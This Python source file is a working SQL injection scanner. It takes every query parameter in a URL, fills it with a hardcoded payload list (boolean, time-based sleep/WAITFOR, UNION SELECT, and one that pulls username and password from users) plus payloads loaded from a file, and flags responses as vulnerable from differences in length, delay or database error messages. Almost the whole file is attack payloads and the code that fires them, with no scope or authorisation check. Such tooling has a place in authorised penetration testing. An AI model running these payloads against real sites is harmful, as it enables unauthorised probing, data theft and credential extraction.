import requests
import time
import json
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import os
SQLI_PAYLOAD_FILE = os.path.join(os.path.dirname(__file__), '..', 'Payloads', 'Sql_payload', 'Generic_Fuzz.txt')
COMMON_SQL_ERRORS = [
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "Unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "SQLSTATE[",
    "syntax error",
    "ORA-",
    "pg_query()",
    "SQLite3::query()",
    "Microsoft OLE DB Provider for SQL Server",
    "mysql_fetch_assoc()",
    "num_rows",
    "invalid query",
    "Fatal error"
]

EXTRA_SQLI_PAYLOADS = [
    "' AND 1=1 --",
    "' AND 1=2 --",
    "\" AND 1=1 --",
    "\" AND 1=2 --",
    "' OR SLEEP(5) --",
    "\" OR SLEEP(5) --",
    "' UNION SELECT null,null --",
    "\" UNION SELECT null,null --",
    "' OR 'a'='a",
    "' OR 'a'='b",
    "' OR 1=1#",
    "' OR 1=2#",
    "'; WAITFOR DELAY '0:0:5'--",
    "'; SELECT pg_sleep(5)--",
    "'; SELECT sleep(5)--",
    "' OR 1=1 LIMIT 1--",
    "' OR 1=1 ORDER BY 1--",
    "' OR EXISTS(SELECT * FROM users)--",
    "' OR 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS INT)--",
    "' OR 1=1 UNION SELECT 1,2,3--",
    "' OR 1=1 UNION SELECT username, password FROM users--",
    "' OR 1=1;--",
    "' OR 1=1/*",
    "' OR ''='",
    "\" OR \"\"=\"",
    "' OR 1=1-- -",
    "\" OR 1=1-- -"
]

def load_payloads(filepath):
    with open(filepath, "r", encoding="utf-8") as f:
        file_payloads = [line.strip() for line in f if line.strip()]
    all_payloads = list(dict.fromkeys(file_payloads + EXTRA_SQLI_PAYLOADS))
    return all_payloads

def inject_payload(url, param, payload):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    query[param] = payload
    new_query = urlencode(query, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_query, ''))

def scan_sqli(url):
    payloads = load_payloads(SQLI_PAYLOAD_FILE)
    results = []
    print(f"[+] Starting SQL Injection scan on {url}")
    parsed = urlparse(url)
    params = list(parse_qs(parsed.query).keys())
    if not params:
        print("[-] No query params found to test for SQL Injection")
        return
    for param in params:
        # Boolean-based SQLi check
        try:
            url_true = inject_payload(url, param, "' AND 1=1 --")
            url_false = inject_payload(url, param, "' AND 1=2 --")
            r_true = requests.get(url_true, timeout=7)
            r_false = requests.get(url_false, timeout=7)
            if abs(len(r_true.text) - len(r_false.text)) > 50:
                print(f"[!] Boolean-based SQLi detected in {param}")
                results.append({"type": "boolean-based", "param": param, "url": url_true})
        except Exception as e:
            print(f"[!] Error during boolean-based SQLi check: {e}")

        for payload in payloads:
            test_url = inject_payload(url, param, payload)
            try:
                # Time-based SQLi check
                if "SLEEP" in payload.upper() or "WAITFOR DELAY" in payload.upper() or "PG_SLEEP" in payload.upper():
                    start = time.time()
                    resp = requests.get(test_url, timeout=10)
                    elapsed = time.time() - start
                    if elapsed > 4:
                        print(f"[!] Time-based SQLi detected in {param} using {payload}")
                        results.append({"type": "time-based", "param": param, "payload": payload, "url": test_url})
                else:
                    resp = requests.get(test_url, timeout=7)
                    for error in COMMON_SQL_ERRORS:
                        if error.lower() in resp.text.lower():
                            print(f"[!] Error-based SQLi in {param} with payload: {payload}")
                            results.append({"type": "error-based", "param": param, "payload": payload, "url": test_url})
            except requests.exceptions.Timeout:
                print(f"[!] Timeout for {test_url}")
            except requests.exceptions.ConnectionError:
                print(f"[!] Connection error for {test_url}")
            except Exception as e:
                print(f"[!] Unexpected error: {e}")

    if results:
        with open("sqli_results.json", "w") as f:
            json.dump(results, f, indent=2)
    else:
        print("[-] No SQL Injection vulnerabilities detected.")
    print("[*] SQL Injection scan complete.")